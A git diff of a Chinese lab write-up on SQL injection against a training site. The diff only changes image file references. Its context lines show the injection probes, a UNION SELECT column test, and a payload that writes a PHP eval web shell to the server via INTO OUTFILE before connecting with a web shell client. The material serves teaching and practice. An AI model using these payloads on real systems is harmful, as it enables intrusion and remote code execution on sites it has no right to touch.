@@ -29,7 +29,7 @@ description: 记录学习平台上实验过程和注入的思路
   
 当我们尝试去http://192.168.1.26:8083/show.php?id=33‘访问时，出现了报错信息
 
-![&#x7A0B;&#x5E8F;&#x62A5;&#x9519;&#x4FE1;&#x606F;](../.gitbook/assets/image%20%28134%29.png)
+![&#x7A0B;&#x5E8F;&#x62A5;&#x9519;&#x4FE1;&#x606F;](../.gitbook/assets/image%20%28135%29.png)
 
 通过以上3次测试，我们可以得出基本的两个结论：  
 1.存在sql注入漏洞  
@@ -39,7 +39,7 @@ description: 记录学习平台上实验过程和注入的思路
 
 ![&#x957F;&#x5EA6;&#x4E3A;16&#x65F6;&#x62A5;&#x9519;](../.gitbook/assets/image%20%2815%29.png)
 
-![&#x957F;&#x5EA6;&#x4E3A;15&#x65F6;&#x6B63;&#x5E38;&#x663E;&#x793A;](../.gitbook/assets/image%20%28131%29.png)
+![&#x957F;&#x5EA6;&#x4E3A;15&#x65F6;&#x6B63;&#x5E38;&#x663E;&#x793A;](../.gitbook/assets/image%20%28132%29.png)
 
 测试一下显示的是第几个字段，http://192.168.1.26:8083/show.php?id=33 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15。发现第3个和第11个有回显
 
@@ -63,7 +63,7 @@ description: 记录学习平台上实验过程和注入的思路
 
 后台页面竟然有报错信息......，暴露了目录，直接写一个木马。http://192.168.1.26:8083/show.php?id=33 union select '&lt;?php eval\($\_POST\[cmd\]\); ?&gt;',1,1,1,1,1,1,1,1,1,1,1,1,1,1 into outfile D:\\WWW\\cms\\ma.php
 
-![](../.gitbook/assets/image%20%28136%29.png)
+![](../.gitbook/assets/image%20%28137%29.png)
 
 菜刀链接 
 
